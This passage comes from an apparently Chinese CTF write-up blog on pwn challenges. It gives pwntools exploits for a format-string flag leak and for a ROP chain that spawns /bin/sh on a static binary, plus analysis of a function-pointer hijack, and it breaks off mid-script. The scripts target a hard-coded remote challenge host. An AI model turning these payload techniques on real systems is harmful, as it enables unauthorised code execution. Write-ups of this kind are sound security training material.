vuln函数分析\n![image-20250524204837954](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524204837954.png)\n1.非常明显的格式化字符串漏洞，结合上文。第一个想到把flag的地址写入，同时用\"%s\"对flag内容进行打印。\n2.64位要加上6，因为有前6个寄存器。最后的偏移还是需要gdb查看。因为可以输入0x10，所以可以把__bss_start+0x520布置在下面。\n\n### gdb分析\n\n![image-20250524205449833](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524205449833.png)\n1.找到printf函数的栈帧，可以看到我们的输入是在偏移为0 的位置，加上6就是6.\n2.把地址写在下面的话，偏移就是7。\n\n### exp\n```python\nfrom pwn import *\ncontext.log_level='debug'\nmode=1\nurl='43.139.51.42'\nport=38430\nif mode==0 :\n\tio=process(\"./flagreader\")\nelse:\n\tio=remote(url,port)\n#gdb.attach(io)\nio.recvuntil(\"Here is your gift: \")\nbss_start=int(io.recv(14),16)\nlog.success(\"bss-{}\".format(hex(bss_start)))\nflag=bss_start+1312\npayload=b'%7$s'.ljust(8,b'\\x41')\npayload+=p64(flag)\n\nio.send(payload)\n\nio.interactive()\n```","slug":"ctf比赛复现/HXCTF决赛/writeup","published":1,"date":"2025-10-06T14:48:09.870Z","updated":"2025-10-06T14:57:27.041Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ip0045uomygtdo37eq","content":"<h1 id=\"final\"><a href=\"#final\" class=\"headerlink\" title=\"final\"></a>final</h1><h2 id=\"alongrop\"><a href=\"#alongrop\" class=\"headerlink\" title=\"alongrop\"></a>alongrop</h2><h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524195608074.png\" alt=\"image-20250524195608074\"><br>1.打开第一眼，左边函数特多，加载特慢。静态编译的文件<br>2.如图框出部分，提示ROPchain。同时0x256字节的输入，显然是ROP。<br>3.最后，标记出偏移是0x40+0x8</p>\n<h3 id=\"gdb-ROPgadget-分析\"><a href=\"#gdb-ROPgadget-分析\" class=\"headerlink\" title=\"gdb &amp; ROPgadget 分析\"></a>gdb &amp; ROPgadget 分析</h3><p><code>ROPgadget --binary alongrop --ropchain</code><br><strong>使用命令查看一下ropchain</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- Step <span class=\"number\">5</span> -- Build the ROP chain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"comment\"># execve generated by ROPgadget</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Padding goes here</span></span><br><span class=\"line\">p = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c0</span>) <span class=\"comment\"># @ .data</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004211eb</span>) <span class=\"comment\"># pop rax ; ret</span></span><br><span class=\"line\">p += <span class=\"string\">b&#x27;/bin//sh&#x27;</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004205c5</span>) <span class=\"comment\"># mov qword ptr [rsi], rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000044cf30</span>) <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004205c5</span>) <span class=\"comment\"># mov qword ptr [rsi], rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000402148</span>) <span class=\"comment\"># pop rdi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c0</span>) <span class=\"comment\"># @ .data</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">\tp += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000040190d</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000044cf30</span>) <span class=\"comment\"># xor rax, rax ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x000000000046a060</span>) <span class=\"comment\"># add rax, 1 ; ret</span></span><br><span class=\"line\">p += pack(<span class=\"string\">&#x27;&lt;Q&#x27;</span>, <span class=\"number\">0x00000000004012d3</span>) <span class=\"comment\"># syscall</span></span><br></pre></td></tr></table></figure>\n<p>1.有可以直接写的ROPchain，但是应该不行，因为太长了。我们可以搜寻一下pop_rax;ret,直接将rax设置为0x3b，这样可以减少很多字节。<br>2.然后不要忘记输入ROPchain前有0x40+0x8的垃圾数据要填充。</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> struct <span class=\"keyword\">import</span> pack</span><br><span class=\"line\"></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">38369</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\tio=process(<span class=\"string\">&quot;./alongrop&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tio=remote(url,port)</span><br><span class=\"line\"><span class=\"comment\">#gadgets</span></span><br><span class=\"line\">pop_rax=<span class=\"number\">0x00000000004211eb</span></span><br><span class=\"line\">pop_rbx=<span class=\"number\">0x000000000040190d</span></span><br><span class=\"line\">pop_rsi_rbp=<span class=\"number\">0x0000000000404ed2</span></span><br><span class=\"line\">pop_rdi_rbp=<span class=\"number\">0x0000000000402148</span></span><br><span class=\"line\"><span class=\"comment\"># </span></span><br><span class=\"line\">offset=<span class=\"number\">0x40</span>+<span class=\"number\">0x8</span></span><br><span class=\"line\">payload=offset*<span class=\"string\">b&quot;a&quot;</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004211eb</span>)</span><br><span class=\"line\">payload+=<span class=\"string\">b&#x27;/bin//sh&#x27;</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004205c5</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x000000000044cf30</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004205c5</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000402148</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c0</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x0000000000404ed2</span>) <span class=\"comment\"># pop rsi ; pop rbp ; ret</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x4141414141414141</span>) <span class=\"comment\"># padding</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x000000000040190d</span>) <span class=\"comment\"># pop rdx ; ret</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004aa0c8</span>) <span class=\"comment\"># @ .data + 8</span></span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004211eb</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">59</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x00000000004012d3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"><span class=\"comment\">## </span></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"secret\"><a href=\"#secret\" class=\"headerlink\" title=\"secret\"></a>secret</h2><h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><strong>先进行了一下小小的逆向，把一些变量和函数名字改了一下</strong></p>\n<h4 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524200824362.png\"><br>1.第一眼看到输入赋值给v3,但v3是数组。v3[0]是我们的选项<br>2.关于后续功能的实现有猫腻，<code>funcs[v3[0]-1]()</code>.稍微有点经验就能看出来，这是在调用funcs[]中的函数，那么funcs中到底有什么呢？跟进去看看。</p>\n<h4 id=\"funcs数组分析\"><a href=\"#funcs数组分析\" class=\"headerlink\" title=\"funcs数组分析\"></a>funcs数组分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201339633.png\" alt=\"image-20250524201339633\"><br>1.对ida熟悉一点，就知道这里存放的是函数的地址，分别就是menu中三个选项对应的函数。<br>2.所以假设前面的v3&#x3D;1，那么就会执行funcs[0],也就是加密。<br>3.理清了程序执行功能的逻辑，再来看每个功能。这题最关键的事encrypt，我在这里就自分析这个。</p>\n<h4 id=\"encrypt分析\"><a href=\"#encrypt分析\" class=\"headerlink\" title=\"encrypt分析\"></a>encrypt分析</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524201727975.png\" alt=\"image-20250524201727975\"><br>1.首先会往abcd这里读入0x50字节的数据。<br>2.然后会对这些数据作加密处理，而加密的方式是与某个数组中的一个数，按位异或。<br>3.知道按位异或的作用，a^b&#x3D;c &#x3D;&#x3D;&gt; a&#x3D;b^c,因此，加密的结果再加密，就是原值。<br>4.用来加密的数组就是funcs图中的s1yner<br>5.abcd同样位于data段，并且里funcs很近。</p>\n<h4 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h4><p>1.第一个想法是通过Encrypt中的溢出，覆盖掉funcs的函数，为backdoor(题目留的后门函数，可以cat flag)。但是只有0x50字节，不够，只能刚好写满abcd那个数组。这里意识到，我们只能把后门写在abcd这个数组上。所以应该考虑有没有办法，访问到这里呢？<br>2.继续回去观察main函数，看到输入后会检测v3是否大于3。也就是小于等于3，都是合法的输入。试想，如果输入0，那么最后就是<code>func[-1]()</code>,也就是会调用我们最后输入的8字节的地址。因此，我们可以输入0 和 负数，来访问abcd上的地址。只要对应上。<br>3.那接下来就是解决，加密的问题。很简单，将log_level设置为debug，发送正常的backdoor地址，看看返回的加密内容是什么。然后手敲一下backdoor的地址，把加密后的内容作为原文发送，那么正确的地址就会在加密后被写上去。</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><h4 id=\"加密内容获取\"><a href=\"#加密内容获取\" class=\"headerlink\" title=\"加密内容获取\"></a>加密内容获取</h4><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250524203433694.png\" alt=\"image-20250524203433694\"><br>1.直接发送p64(backdoor)，查看加密的内容。<br>2.从后往前数，因为后面紧跟的是<code>1.Encrupt......</code>，从0x31 往前数8个字节，就是我们要的内容，然后直接发这个就行。</p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span 